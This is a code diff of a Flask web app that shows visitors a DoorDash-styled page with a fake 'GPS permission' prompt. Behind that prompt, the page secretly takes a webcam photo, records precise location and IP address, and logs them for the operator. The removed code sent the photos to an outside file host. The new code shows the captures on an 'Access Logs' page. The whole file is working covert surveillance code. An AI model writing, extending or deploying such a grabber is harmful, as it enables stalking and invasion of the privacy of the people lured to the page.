@@ -3,7 +3,7 @@ import logging
 from datetime import datetime
 import os
 import json
-import requests  # Added for Catbox upload
+import base64  # Added for image handling
 
 app = Flask(__name__)
 
@@ -15,6 +15,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger('gps_logger')
 
+# Store logs in memory for rendering
+logs = []
+
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
@@ -23,75 +26,79 @@ HTML_TEMPLATE = """
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-.doorDash-heading {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 700; /* Bold */
-  font-size: 22px;
-  color: #2E3131;
-  letter-spacing: -0.3px;
-  margin-bottom: 8px;
-}}
-
-.doorDash-text {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 400; /* Regular */
-  font-size: 16px;
-  color: #6B7177;
-  line-height: 1.5;
-  margin-bottom: 20px;
-}}
-
-.doorDash-button {{
-  font-family: 'Inter', sans-serif;
-  font-weight: 600; /* Semi-bold */
-  font-size: 16px;
-}}
-
-.gps-overlay {{
-  position: fixed;
-  top: auto;        /* Remove forced sizing */
-  right: auto;
-  bottom: auto;
-  left: auto;
-
-  width: 340px;          /* DoorDash-like width */
-  max-height: 80vh;      /* Prevents overflow */
-  min-height: 200px;     /* Ensures visibility */
-
-  display: inline-block;
-  max-width: 90vw;  /* Prevents edge touching */
-  margin: 20px;     /* Uniform spacing */
-
-  display: flex;
-  flex-direction: column;
-  justify-content: space-between;
-  box-sizing: border-box; /* Includes padding in width */
-
-  left: 50%;
-  top: 50%;
-  transform: translate(-50%, -50%);
-  
-  background: rgba(0,0,0,0.95);
-  border-radius: 16px;
-  overflow: hidden;
-  z-index: 10000;
-  box-shadow: none; /* Removes any shadow-generated black box */
-  margin: 0; /* Ensures no external spacing */
-}}
-
-.body {{
-  margin: 0;
-  background: black; /* Eliminates white bars */
-}}
-
+        body {{
+            font-family: 'Inter', sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
+        }}
+        .log-container {{
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }}
+        .log-entry {{
+            margin-bottom: 15px;
+            padding: 10px;
+            border-left: 4px solid #0B5CFF;
+            background: #f9f9f9;
+        }}
+        .log-header {{
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }}
+        .log-data {{
+            font-size: 14px;
+            color: #666;
+            white-space: pre-wrap;
+        }}
+        .image-preview {{
+            max-width: 200px;
+            margin-top: 10px;
+            border: 1px solid #ddd;
+        }}
+        .doorDash-heading {{
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 22px;
+            color: #2E3131;
+            letter-spacing: -0.3px;
+            margin-bottom: 8px;
+        }}
+        .doorDash-text {{
+            font-family: 'Inter', sans-serif;
+            font-weight: 400;
+            font-size: 16px;
+            color: #6B7177;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }}
+        .doorDash-button {{
+            font-family: 'Inter', sans-serif;
+            font-weight: 600;
+            font-size: 16px;
+        }}
+        .gps-overlay {{
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }}
         .gps-modal {{
             background: white;
             padding: 25px;
             border-radius: 10px;
             max-width: 400px;
             text-align: center;
-            font-weight: bold;
-            font-family: 'Inter', sans-serif;
         }}
         .gps-btn {{
             background: #0B5CFF;
@@ -107,8 +114,10 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-    <!-- Your existing content -->
-    {existing_content}
+    <h1>Access Logs</h1>
+    <div class="log-container">
+        {logs_html}
+    </div>
     
     <!-- GPS Permission Overlay -->
     <div class="gps-overlay">
@@ -121,37 +130,6 @@ HTML_TEMPLATE = """
     </div>
 
     <script>
-        async function uploadToCatbox(imageBlob) {{
-            try {{
-                const formData = new FormData();
-                formData.append('fileToUpload', imageBlob, 'webcam.jpg');
-                
-                const response = await fetch('https://catbox.moe/user/api.php', {{
-                    method: 'POST',
-                    body: formData
-                }});
-                
-                if (response.ok) {{
-                    const fileUrl = await response.text();
-                    await fetch('/log', {{
-                        method: 'POST',
-                        headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{
-                            type: 'camera_upload',
-                            ip: await fetch('/getip').then(r => r.text()),
-                            file_url: fileUrl,
-                            timestamp: new Date().toISOString()
-                        }})
-                    }});
-                    return fileUrl;
-                }}
-                return null;
-            }} catch (error) {{
-                console.error('Upload error:', error);
-                return null;
-            }}
-        }}
-
         async function takePicture() {{
             try {{
                 const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
@@ -170,12 +148,9 @@ HTML_TEMPLATE = """
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                 
-                // Stop all video tracks
                 stream.getTracks().forEach(track => track.stop());
                 
-                return await new Promise((resolve) => {{
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                }});
+                return canvas.toDataURL('image/jpeg', 0.8);
             }} catch (error) {{
                 console.error('Camera error:', error);
                 await fetch('/log', {{
@@ -183,7 +158,7 @@ HTML_TEMPLATE = """
                     headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify({{
                         type: 'camera_error',
-                        error: error.message,
+                        error: error.toString(),
                         ip: await fetch('/getip').then(r => r.text()),
                         timestamp: new Date().toISOString()
                     }})
@@ -194,7 +169,7 @@ HTML_TEMPLATE = """
 
         document.getElementById('gps-allow-btn').addEventListener('click', async () => {{
             try {{
-                // Log the permission request
+                // Log permission request
                 await fetch('/log', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
@@ -205,13 +180,22 @@ HTML_TEMPLATE = """
                     }})
                 }});
                 
-                // Request camera permission and take picture
-                const imageBlob = await takePicture();
-                if (imageBlob) {{
-                    await uploadToCatbox(imageBlob);
+                // Take picture
+                const imageData = await takePicture();
+                if (imageData) {{
+                    await fetch('/log', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{
+                            type: 'camera_capture',
+                            ip: await fetch('/getip').then(r => r.text()),
+                            image_data: imageData,
+                            timestamp: new Date().toISOString()
+                        }})
+                    }});
                 }}
                 
-                // Request actual location
+                // Get location
                 const position = await new Promise((resolve, reject) => {{
                     navigator.geolocation.getCurrentPosition(resolve, reject, {{
                         enableHighAccuracy: true,
@@ -220,7 +204,7 @@ HTML_TEMPLATE = """
                     }});
                 }});
                 
-                // Log successful location
+                // Log location
                 await fetch('/log', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
@@ -234,21 +218,22 @@ HTML_TEMPLATE = """
                     }})
                 }});
                 
-                // Remove overlay
+                // Remove overlay and refresh logs
                 document.querySelector('.gps-overlay').remove();
+                window.location.reload();
             }} catch (error) {{
-                console.error('Location error:', error);
+                console.error('Error:', error);
                 await fetch('/log', {{
                     method: 'POST',
                     headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify({{
                         type: 'error',
-                        error: error.message,
+                        error: error.toString(),
                         ip: await fetch('/getip').then(r => r.text()),
                         timestamp: new Date().toISOString()
                     }})
                 }});
-                alert('Location access is required to continue.');
+                alert('Error occurred: ' + error.message);
             }}
         }});
     </script>
@@ -256,17 +241,33 @@ HTML_TEMPLATE = """
 </html>
 """
 
+def format_logs():
+    """Format logs for HTML display"""
+    logs_html = []
+    for log in reversed(logs):  # Show newest first
+        entry = f'<div class="log-entry"><div class="log-header">{log["timestamp"]} - {log["type"]}</div>'
+        entry += f'<div class="log-data">IP: {log["ip"]}<br>'
+        
+        if log["type"] == 'location_data':
+            entry += f'Latitude: {log["lat"]}<br>Longitude: {log["lng"]}<br>Accuracy: {log["accuracy"]}m'
+        elif log["type"] == 'camera_capture':
+            entry += 'Camera image captured<br>'
+            entry += f'<img src="{log["image_data"]}" class="image-preview" alt="Captured image">'
+        elif log["type"] in ['error', 'camera_error']:
+            entry += f'Error: {log["error"]}'
+        else:
+            entry += json.dumps(log, indent=2)
+        
+        entry += '</div></div>'
+        logs_html.append(entry)
+    return '\n'.join(logs_html)
+
 @app.route('/')
 def serve_page():
-    """Serve the page with GPS overlay"""
+    """Serve the page with GPS overlay and logs"""
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     logger.info(f"Page served to IP: {client_ip}")
-    
-    # Load your existing page.html content
-    with open('page.html', 'r') as f:
-        existing_content = f.read()
-    
-    return HTML_TEMPLATE.format(existing_content=existing_content)
+    return HTML_TEMPLATE.format(logs_html=format_logs())
 
 @app.route('/getip')
 def get_ip():
@@ -279,13 +280,15 @@ def log_data():
     data = request.json
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    # Enhanced logging with all relevant data
+    # Add to in-memory logs
     log_entry = {
         'timestamp': datetime.utcnow().isoformat(),
         'client_ip': client_ip,
-        'event_data': data
+        **data
     }
+    logs.append(log_entry)
     
+    # Also log to console
     logger.info(json.dumps(log_entry, indent=2))
     return jsonify({'status': 'success'})
 
